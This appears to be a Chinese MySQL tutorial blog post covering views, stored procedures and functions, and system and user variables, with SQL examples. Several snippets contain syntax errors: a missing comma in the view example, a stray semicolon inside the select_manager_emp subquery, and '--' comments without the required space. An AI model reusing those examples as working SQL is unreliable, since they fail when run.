<li>视图，是向用户提供基表数据的另一种表现形式。通常情况下，小型项目的数据库可以不使用视图，但是在大型项目中，以及数据表比较复杂的情况下，视图的价值就凸显出来了，它可以帮助我们把经常查询的结果集放到虚拟表中，提升使用效率。理解和使用起来都非常方便。</li>
</ul>
<p><strong>优点</strong><br>视图操作简单，可以减少数据冗余，从而简化查询；控制数据的访问，提高数据安全；适应灵活多变的需求；能够分解复杂的查询逻辑。<br><strong>不足</strong><br>如果我们在实际数据表的基础上创建了视图，那么，如果实际数据表的结构变更了，我们就需要及时对相关的视图进行相应的维护。特别是嵌套的视图（就是在视图的基础上创建视图），维护会变得比较复杂， 可读性不好 ，容易变成系统的潜在隐患。因为创建视图的 SQL 查询可能会对字段重命名，也可能包含复杂的逻辑，这些都会增加维护的成本</p>
<h3 id="视图的创建、查看、修改和删除"><a href="#视图的创建、查看、修改和删除" class="headerlink" title="视图的创建、查看、修改和删除"></a>视图的创建、查看、修改和删除</h3><p><strong>视图的创建</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建视图-</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name <span class="keyword">AS</span> <span class="keyword">select</span>查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建单表视图 </span></span><br><span class="line"><span class="comment">-- 方式一 视图字段名和基表字段名一致</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name <span class="keyword">AS</span> <span class="keyword">SELECT</span> COLUMNS <span class="keyword">FROM</span> table_name (<span class="keyword">WHERE</span> ...);</span><br><span class="line"><span class="comment">-- 方式二 自定义的字段名,个数必须与select中字段数相同</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name(column_names) <span class="keyword">AS</span> <span class="keyword">SELECT</span> columns <span class="keyword">FROM</span> table_name (<span class="keyword">WHERE</span> ...);</span><br><span class="line"><span class="comment">-- 方式三 聚合函数等操作的结果转为视图字段，实际每次都查看视图都会执行视图创建语句，示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name(id,avg_sal) <span class="keyword">AS</span> <span class="keyword">SELECT</span> id <span class="built_in">avg</span>(salary) <span class="keyword">FROM</span> table_name (<span class="keyword">WHERE</span> ...);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 针对多表时即将select语句改为多表查询的语句</span></span><br><span class="line"><span class="comment">-- 同时还可以针对视图创建视图，将视图作为表代入select语句查询即可</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>查看视图</strong>和查看表一样</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看视图对象</span></span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="comment">-- 查看视图结构</span></span><br><span class="line"><span class="keyword">DESC</span> view_name;</span><br><span class="line"><span class="comment">-- 查看视图的属性信息</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;view_name&#x27;</span></span><br><span class="line"><span class="comment">-- 查看视图的详细定义信息</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name;</span><br></pre></td></tr></table></figure>

<p><strong>修改视图</strong>类似表的修改</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方法1 create or replace view</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> view_name(column_names`可省`)<span class="keyword">AS</span> `新`<span class="keyword">SELECT</span> ...</span><br><span class="line"><span class="comment">-- 方法2 alter view</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> view_name <span class="keyword">AS</span> <span class="keyword">SELECT</span> ...</span><br></pre></td></tr></table></figure>

<p><strong>删除视图</strong> 只是删除视图的定义，并不会删除基表的数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除视图必须先删除其子视图</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IF <span class="keyword">EXISTS</span> view_names;</span><br></pre></td></tr></table></figure>


<h3 id="视图数据的更新"><a href="#视图数据的更新" class="headerlink" title="视图数据的更新"></a>视图数据的更新</h3><p><strong>增删改视图数据都会影响基表，不建议在视图上进行此操作</strong><br>要使视图可更新，视图中的行和底层基本表中的行之间必须存在 一对一 的关系。更新方法同表的数据的更新</p>
<p><strong>不可更新视图</strong></p>
<ol>
<li>在定义视图的时候<code>指定了“ALGORITHM = TEMPTABLE”</code>，视图将<code>不支持INSERT和DELETE</code>操作；</li>
<li>视图中不包含基表中所有被定义为非空又未指定默认值的列，视图<code>将不支持INSERT</code>操作；</li>
<li>在定义视图的SELECT语句中<code>使用了JOIN联合查询</code> ，视图将<code>不支持INSERT和DELETE</code>操作；</li>
<li>在定义视图的SELECT语句后的字段列表中<code>使用了数学表达式</code>或<code>子查询</code> ，视图将<code>不支持INSERT</code>，也<code>不支持UPDATE</code>使用了数学表达式、子查询的字段值；</li>
<li>在定义视图的SELECT语句后的字段列表中<code>使用DISTINCT、聚合函数、GROUP BY、HAVING、UNION等</code>，视图将<code>不支持INSERT、UPDATE、DELETE</code>；</li>
<li>在定义视图的SELECT语句中<code>包含了子查询</code>，而子查询中引用了FROM后面的表，视图将<code>不支持INSERT、UPDATE、DELETE；</code></li>
<li>视图定义基于一个<code>不可更新视图</code> ；</li>
<li>常量视图。</li>
</ol>
<h2 id="存储过程和存储函数"><a href="#存储过程和存储函数" class="headerlink" title="存储过程和存储函数"></a>存储过程和存储函数</h2><p>存储函数和存储过程对比：</p>
<p>|名称|关键字|调用语法|返回值|应用场景<br>|—|————-|————–|—–|<br>|存储过程|PROCEDURE|CALL 存储过程()|理解为有0个或多个|一般用于更新|<br>|存储函数|FUNCTION|SELECT 函数()|只能是一个|一般用于查询结果为一个值并返回时|</p>
<p>此外，存储函数可以放在查询语句中使用，存储过程不行。反之，存储过程的功能更加强大，包括能够<br>执行对表的操作（比如创建表，删除表等）和事务操作，这些功能是存储函数不具备的</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>含义：存储过程的英文是<code>Stored Procedure</code>。它的思想很简单，就是一组经过<code>预先编译</code>的SQL语句的封装。</p>
<p>执行过程：存储过程预先存储在MySQL服务器上，需要执行的时候，客户端只需要向服务器端发出调用存储过程的命令，服务器端就可以把预先存储好的这一系列 SQL 语句全部执行。</p>
<p><strong>好处：</strong></p>
<ol>
<li>简化操作，提高了sql语句的重用性，减少了开发程序员的压力 </li>
<li>减少操作过程中的失误，提高效率</li>
<li>减少网络传输量（客户端不需要把所有的 SQL 语句通过网络发给服务器） </li>
<li>减少了 SQL 语句暴露在网上的风险，也提高了数据查询的安全性</li>
</ol>
<p><strong>和视图、函数的对比：</strong><br>它和视图有着同样的优点，清晰、安全，还可以减少网络传输量。不过它和视图不同，视图是 虚拟表 ，通常不对底层数据表直接操作，而存储过程是程序化的 SQL，可以 直接操作底层数据表 ，相比于面向集合的操作方式，能够实现一些更复杂的数据处理。一旦存储过程被创建出来，使用它就像使用函数一样简单，我们直接通过调用存储过程名即可。相较于函数，存储过程是 没有返回值 的。</p>
<p><strong>分类</strong><br>存储过程的参数类型可以是IN、OUT和INOUT。根据这点分类如下：<br>1、没有参数（无参数无返回）<br>2、仅仅带 IN 类型（有参数无返回）<br>3、仅仅带 OUT 类型（无参数有返回）<br>4、既带 IN 又带 OUT（有参数有返回）<br>5、带 INOUT（有参数有返回）<br>注意：IN、OUT、INOUT 都可以在一个存储过程中带多个</p>
<h3 id="存储过程的创建"><a href="#存储过程的创建" class="headerlink" title="存储过程的创建"></a>存储过程的创建</h3><p><strong>语法</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> 存储过程名(<span class="keyword">IN</span><span class="operator">|</span><span class="keyword">OUT</span><span class="operator">|</span><span class="keyword">INOUT</span> 参数名 参数类型,...)</span><br><span class="line">[characteristics ...]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">存储过程体</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<p>说明：<br>说明：</p>
<ol>
<li>参数前面的符号的意思</li>
</ol>
<ul>
<li>IN：当前参数为输入参数，也就是表示入参；存储过程只是读取这个参数的值。如果没有定义参数种类，默认就是IN，表示输入参数。</li>
<li>OUT：当前参数为输出参数，也就是表示出参；执行完成之后，调用这个存储过程的客户端或者应用程序就可以读取这个参数返回的值了。</li>
<li>INOUT：当前参数既可以为输入参数，也可以为输出参数</li>
</ul>
<ol start="2">
<li>形参类型可以是 MySQL数据库中的任意类型。</li>
<li>characteristics 表示创建存储过程时指定的对存储过程的约束条件，其取值信息如下，含义使用时查询<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="operator">|</span> [<span class="keyword">NOT</span>] <span class="keyword">DETERMINISTIC</span></span><br><span class="line"><span class="operator">|</span> &#123; <span class="keyword">CONTAINS</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA <span class="operator">|</span> <span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA &#125;</span><br><span class="line"><span class="operator">|</span> <span class="keyword">SQL</span> SECURITY &#123; DEFINER <span class="operator">|</span> INVOKER &#125;</span><br><span class="line"><span class="operator">|</span> COMMENT <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>存储过程体中可以有多条 SQL 语句，如果仅仅一条SQL 语句，则可以省略 BEGIN 和 END</li>
<li>需要设置新的结束标记<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER 新的结束标记</span><br></pre></td></tr></table></figure></li>
</ol>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建过程查看employee表的所有数据</span></span><br><span class="line">DELIMITER $ <span class="comment">--使用$作为存储过程的结束符</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> select_data_emp()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee;</span><br><span class="line"><span class="keyword">END</span> $</span><br><span class="line">DELIMITER ; <span class="comment">--恢复;作为结束符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建过程查看employee表某个人工资</span></span><br><span class="line">DELIMITER $ <span class="comment">--使用$作为存储过程的结束符</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> select_salary_emp(<span class="keyword">IN</span> i_name <span class="type">varchar</span>(<span class="number">20</span>),<span class="keyword">OUT</span> o_salary <span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>)) </span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">SELECT</span> salary <span class="keyword">INTO</span> o_salary <span class="keyword">FROM</span> employee <span class="keyword">where</span> last_name <span class="operator">=</span> i_name;</span><br><span class="line"><span class="keyword">END</span>$</span><br><span class="line">DELIMITER ; <span class="comment">--恢复;作为结束符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--使用</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@i_name</span> <span class="operator">=</span> <span class="string">&#x27;abel&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> select_salary_emp(<span class="variable">@i_name</span>,<span class="variable">@o_salary</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@o_salary</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询领导姓名</span></span><br><span class="line">DELIMITER $ <span class="comment">--使用$作为存储过程的结束符</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> select_manager_emp(<span class="keyword">INOUT</span> m_name <span class="type">VARCHAR</span>(<span class="number">25</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">SELECT</span> last_name <span class="keyword">INTO</span> m_name <span class="keyword">FROM</span> employee <span class="keyword">where</span> employee_id <span class="operator">=</span> (</span><br><span class="line">      <span class="keyword">SELECT</span> manager_id <span class="keyword">From</span> employee <span class="keyword">WHERE</span> last_name <span class="operator">=</span> m_name;</span><br><span class="line">   );</span><br><span class="line"><span class="keyword">END</span>$</span><br><span class="line">DELIMITER ; <span class="comment">--恢复;作为结束符</span></span><br></pre></td></tr></table></figure>

<h3 id="存储函数的使用"><a href="#存储函数的使用" class="headerlink" title="存储函数的使用"></a>存储函数的使用</h3><p><strong>语法格式</strong>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> 函数名(参数名 参数类型,...)</span><br><span class="line"><span class="keyword">RETURNS</span> 返回值类型</span><br><span class="line">[characteristics ...]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">函数体 #函数体中肯定有 <span class="keyword">RETURN</span> 语句</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<ol>
<li>参数列表：指定参数为IN、OUT或INOUT只对PROCEDURE是合法的，FUNCTION中总是默认为IN参数。</li>
<li>RETURNS type 语句表示函数返回数据的类型；RETURNS子句只能对FUNCTION做指定，对函数而言这是<code>强制</code>的。它用来指定函数的返回类型，而且函数体必须包含一个 RETURN value 语句。</li>
<li>characteristic 创建函数时指定的对函数的约束。取值与创建存储过程时相同，这里不再赘述。</li>
<li>函数体也可以用BEGIN…END来表示SQL代码的开始和结束。如果函数体只有一条语句，也可以省略BEGIN…END</li>
</ol>
<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询id对应email</span></span><br><span class="line">DELIMITER $ <span class="comment">--使用$作为存储过程的结束符</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> email_by_id(emp_id <span class="type">INT</span>) <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">25</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">RETURN</span> (<span class="keyword">SELECT</span> email <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id);</span><br><span class="line"><span class="keyword">END</span>$</span><br><span class="line">DELIMITER ; <span class="comment">--恢复;作为结束符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--调用</span></span><br><span class="line"><span class="keyword">select</span> email_by_id(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong><br>若在创建存储函数中报错“ you might want to use the less safelog_bin_trust_function_creators variable ”，有两种处理方法：</p>
<ul>
<li>方式1：<code>RETURNS 类型</code>后加上必要的函数特性<code>[NOT] DETERMINISTIC</code>和<code>&#123;CONTAINS SQL | NO SQL | READS SQL DATA |MODIFIES SQL DATA&#125;</code></li>
<li>方式2： <code>SET GLOBAL log_bin_trust_function_creators = 1</code>;</li>
</ul>
<h3 id="存储过程和存储函数的查看修改删除"><a href="#存储过程和存储函数的查看修改删除" class="headerlink" title="存储过程和存储函数的查看修改删除"></a>存储过程和存储函数的查看修改删除</h3><p><strong>查看</strong></p>
<ol>
<li>使用SHOW CREATE语句查看存储过程和函数的创建信息<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; 存储过程名或函数名</span><br></pre></td></tr></table></figure></li>
<li>使用SHOW STATUS语句查看存储过程和函数的状态信息<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; STATUS [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span>]</span><br><span class="line"><span class="comment">-- [LIKE &#x27;pattern&#x27;]：匹配存储过程或函数的名称，可以省略。当省略不写时，会列出MySQL数据库中存在的所有存储过程或函数的信息。</span></span><br></pre></td></tr></table></figure>
这个语句返回子程序的特征，如数据库、名字、类型、创建者及创建和修改日期。</li>
<li>从information_schema.Routines表中查看存储过程和函数的信息<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.Routines <span class="keyword">WHERE</span> ROUTINE_NAME<span class="operator">=</span><span class="string">&#x27;存储过程或函数的名&#x27;</span> [<span class="keyword">AND</span> ROUTINE_TYPE <span class="operator">=</span> &#123;<span class="string">&#x27;PROCEDURE|FUNCTION&#x27;</span>&#125;]</span><br><span class="line"><span class="comment">-- PROCEDURE|FUNCTION必须使用大写，存储过程和存储函数重名时必须有此</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>修改</strong><br>修改存储过程或函数，不影响存储过程或函数功能，只是修改相关特性。使用ALTER语句实现。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; 存储过程或函数的名 [characteristic ...]</span><br><span class="line"><span class="comment">-- characteristic指定存储过程或函数的特性，其取值信息与创建存储过程、函数时的取值信息略有不同。</span></span><br><span class="line">&#123; <span class="keyword">CONTAINS</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA <span class="operator">|</span> <span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA &#125;</span><br><span class="line"><span class="operator">|</span> <span class="keyword">SQL</span> SECURITY &#123; DEFINER <span class="operator">|</span> INVOKER &#125;</span><br><span class="line"><span class="operator">|</span> COMMENT <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>删除</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> &#123;<span class="keyword">PROCEDURE</span> <span class="operator">|</span> <span class="keyword">FUNCTION</span>&#125; [IF <span class="keyword">EXISTS</span>] 存储过程或函数的名</span><br></pre></td></tr></table></figure>

<h3 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h3><p>对于存储过程和存储函数的使用，一直都存在着很多争议，比如有些公司对于大型项目要求使用存储过程和函数，而有些公司在手册中明确禁止使用存储过程和函数。</p>
<p><strong>阿里开发规范</strong></p>
<ul>
<li>【强制】禁止使用存储过程和函数，存储过程和函数难以调试和扩展，更没有移植性。</li>
</ul>
<p><strong>优点</strong></p>
<ol>
<li>存储过程和函数可以一次编译多次使用。存储过程和函数只在创建时进行编译，之后的使用都不需要重新编译，这就提升了 SQL 的执行效率。</li>
<li>可以减少开发工作量。将代码 封装 成模块，实际上是编程的核心思想之一，这样可以把复杂的问题拆解成不同的模块，然后模块之间可以 重复使用 ，在减少开发工作量的同时，还能保证代码的结构清晰。</li>
<li>存储过程和函数的安全性强。我们在设定存储过程和函数的时候可以 设置对用户的使用权限 ，这样就和视图一样具有较强的安全性。</li>
<li>可以减少网络传输量。因为代码封装到存储过程和函数中，每次使用只需要调用存储过程和函数即可，这样就减少了网络传输量。</li>
<li>良好的封装性。在进行相对复杂的数据库操作时，原本需要使用一条一条的 SQL 语句，可能要连接多次数据库才能完成的操作，现在变成了一次存储过程和函数，只需要 连接一次即可 。</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li><code>可移植性差</code>。存储过程和函数不能跨数据库移植，比如在 MySQL、Oracle 和 SQL Server 里编写的存储过程，在换成其他数据库时都需要重新编写。</li>
<li><code>调试困难</code>。只有少数 DBMS 支持存储过程和函数的调试。对于复杂的存储过程和函数来说，开发和维护都不容易。虽然也有一些第三方工具可以对存储过程和函数进行调试，但要收费。</li>
<li>存储过程和函数的<code>版本管理很困难</code>。比如数据表索引发生变化了，可能会导致存储过程和函数失效。我们在开发软件的时候往往需要进行版本管理，但是存储过程和函数本身没有版本控制，版本迭代更新的时候很麻烦。</li>
<li>它<code>不适合高并发</code>的场景。高并发的场景需要减少数据库的压力，有时数据库会采用分库分表的方式，而且对可扩展性要求很高，在这种情况下，存储过程和函数会变得难以维护， 增加数据库的压力 ，显然就不适用了。。</li>
</ol>
<h2 id="变量、流程控制和游标"><a href="#变量、流程控制和游标" class="headerlink" title="变量、流程控制和游标"></a>变量、流程控制和游标</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h4><p>系统变量由系统定义，不是用户定义，属于<code>服务器</code>层面。启动MySQL服务，生成MySQL服务实例期间，MySQL将为MySQL服务器内存中的系统变量赋值，这些系统变量定义了当前MySQL服务实例的属性、特征。这些系统变量的值要么是<code>编译MySQL时参数</code>的默认值，要么是<code>配置文件</code>（例如my.ini等）中的参数值。大家可以通过网址<a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html">MySQL文档的系统变量</a>查看。<br>系统变量分为全局系统变量（需要添加<code>global</code>关键字）以及会话系统变量（需要添加<code>session</code>关键字），有时也把全局系统变量简称为全局变量，有时也把会话系统变量称为local变量。如果不写，默认会话级别。静态变量（在<code>MySQL</code>服务实例运行期间它们的值不能使用<code>set</code>动态修改）属于特殊的全局系统变量。<br>每一个MySQL客户机成功连接MySQL服务器后，都会产生与之对应的会话。会话期间，MySQL服务实例会在MySQL服务器内存中生成与该会话对应的会话系统变量，这些会话系统变量的初始值是全局系统变量值的复制。如下图：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240807155020.png" alt="系统变量"></p>
<ul>
<li>全局系统变量针对于所有会话（连接）有效，但<code>不能跨重启</code></li>
<li>会话系统变量仅针对于当前会话（连接）有效。会话期间，当前会话对某个会话系统变量值的修改，不会影响其他会话同一个会话系统变量的值。</li>
<li>会话1对某个全局系统变量值的修改会导致会话2中同一个全局系统变量值的修改。</li>
</ul>
<p><strong>查看系统变量</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看系统变量</span></span><br><span class="line"><span class="comment">-- 查看所有全局变量</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES;</span><br><span class="line"><span class="comment">-- 查看所有会话变量</span></span><br><span class="line"><span class="keyword">SHOW</span> SESSION VARIABLES;</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;</span><br><span class="line"><span class="comment">-- 查看满足条件的部分系统变量。</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%标识符%&#x27;</span>;</span><br><span class="line"><span class="comment">-- 查看满足条件的部分会话变量</span></span><br><span class="line"><span class="keyword">SHOW</span> SESSION VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%标识符%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看指定系统变量 </span></span><br><span class="line"><span class="comment">/*MySQL 中的系统变量以 两个“@” 开头，其中“@@global”仅用于标记全局系统变量，“@@session”仅用于标记会话系统变量。“@@”首先标记会话系统变量，如果会话系统变量不存在，则标记全局系统变量。*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看指定的系统变量的值</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.变量名;</span><br><span class="line"><span class="comment">-- 查看指定的会话变量的值</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@session</span>.变量名;</span><br><span class="line"><span class="comment">-- 或者</span></span><br><span class="line"><span class="keyword">SELECT</span> @@变量名</span><br></pre></td></tr></table></figure>

<p><strong>修改系统变量</strong></p>
<p>方式1：修改MySQL 配置文件 ，继而修改MySQL系统变量的值（该方法需要重启MySQL服务）<br>方式2：在MySQL服务运行期间，使用“set”命令重新设置系统变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 为某个系统变量赋值 两种方法 只针对当前数据库实例有效，一旦重启服务将会失效</span></span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@global</span>.变量名<span class="operator">=</span>变量值;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> 变量名<span class="operator">=</span>变量值;</span><br><span class="line"><span class="comment">-- MySQL8.0 下可以持久更改全局变量</span></span><br><span class="line"><span class="keyword">SET</span> PERSIST <span class="keyword">global</span> 变量名 <span class="operator">=</span> 变量值</span><br><span class="line"><span class="comment">-- 配置保存到数据目录下的 mysqld-auto.cnf 文件中，下次启动时会读取该文件，用其中的配置来覆盖默认的配置文件。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为某个会话变量赋值 两种方法 只针对当前会话有效，重新建立的会话还是默认值</span></span><br><span class="line"><span class="keyword">SET</span> @<span class="variable">@session</span>.变量名<span class="operator">=</span>变量值;</span><br><span class="line"><span class="keyword">SET</span> SESSION 变量名<span class="operator">=</span>变量值;</span><br></pre></td></tr></table></figure>


<h4 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h4><p>用户变量是用户自己定义的，根据作用范围不同，又分为<code>会话用户变量</code>和<code>局部变量</code>。作为<code>MySQL</code>编码规范，MySQL中的会话用户变量以一个<code>@</code>开头。</p>
<ul>
<li>会话用户变量：作用域和会话变量一样，只对<code>当前连接</code>会话有效。</li>
<li>局部变量：只在 BEGIN 和 END 语句块中有效。局部变量只能在<code>存储过程和函数</code>中使用。</li>
</ul>
<p><strong>会话用户变量的定义和使用</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 定义</span></span><br><span class="line"><span class="comment">-- 方式1：“=”或“:=”</span></span><br><span class="line"><span class="keyword">SET</span> @用户变量 <span class="operator">=</span> 值;</span><br><span class="line"><span class="keyword">SET</span> @用户变量 :<span class="operator">=</span> 值;</span><br><span class="line"><span class="comment">-- 方式2：“:=” 或 INTO关键字</span></span><br><span class="line"><span class="keyword">SELECT</span> @用户变量 :<span class="operator">=</span> 表达式 [<span class="keyword">FROM</span> 等子句]; <span class="comment">-- SELECT @count:= COUNT(*) FROM employees;</span></span><br><span class="line"><span class="keyword">SELECT</span> 表达式 <span class="keyword">INTO</span> @用户变量 [<span class="keyword">FROM</span> 等子句] <span class="comment">-- SELECT COUNT(*) into @count FROM employees;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">SELECT</span> @用户变量</span><br></pre></td></tr></table></figure>


<p><strong>局部变量的定义和使用</strong></p>
<p>定义：可以使用<code>DECLARE</code>语句定义一个局部变量<br>作用域：仅仅在定义它的<code>BEGIN...END</code>中有效，<code>只能在存储过程或存储函数中使用</code><br>位置：只能放在<code>BEGIN...END</code>中，而且只能放在第一句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="comment">-- 声明局部变量</span></span><br><span class="line"><span class="keyword">DECLARE</span> 变量名<span class="number">1</span> 变量数据类型 [<span class="keyword">DEFAULT</span> 变量默认值];</span><br><span class="line"><span class="keyword">DECLARE</span> 变量名<span class="number">2</span>,变量名<span class="number">3</span>,... 变量数据类型 [<span class="keyword">DEFAULT</span> 变量默认值];</span><br><span class="line"><span class="comment">-- 为局部变量赋值</span></span><br><span class="line"><span class="keyword">SET</span> 变量名<span class="number">1</span> <span class="operator">=</span> 值;</span><br><span class="line"><span class="keyword">SET</span> 变量名<span class="number">2</span>:<span class="operator">=</span>值;</span><br><span class="line"><span class="keyword">SELECT</span> 值 <span class="keyword">INTO</span> 变量名<span class="number">3</span> [<span class="keyword">FROM</span> 子句];</span><br><span class="line"><span class="comment">-- 查看局部变量的值</span></span><br><span class="line"><span class="keyword">SELECT</span> 变量<span class="number">1</span>,变量<span class="number">2</span>,变量<span class="number">3</span>;</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<p><strong>局部变量和会话用户变量</strong></p>
<table>
<thead>
<tr>
<th>作用域</th>
<th>定义位置</th>
<th>语法</th>
</tr>
</thead>
<tbody><tr>
<td>会话用户变量</td>
<td>当前会话</td>
<td>会话的任何地方，加@符号，不用指定类型</td>
</tr>
<tr>
<td>局部变量</td>
<td>定义它的BEGIN END中</td>
<td>BEGIN END的第一句话，一般不用加@，需要指定类型</td>
</tr>
</tbody></table>
<h3 id="定义条件与处理程序"><a href="#定义条件与处理程序" class="headerlink" title="定义条件与处理程序"></a>定义条件与处理程序</h3><p>(类似于异常处理，定义条件即异常，处理程序即异常的处理)</p>
<p><code>定义条件</code>是事先定义程序执行过程中可能遇到的问题，<code>处理程序</code>定义了在遇到问题时应当采取的处理方式，并且保证存储过程或函数在遇到警告或错误时能继续执行。这样可以增强存储程序处理问题的能力，避免程序异常停止运行。<br>说明：定义条件和处理程序在存储过程、存储函数中都是支持的。</p>
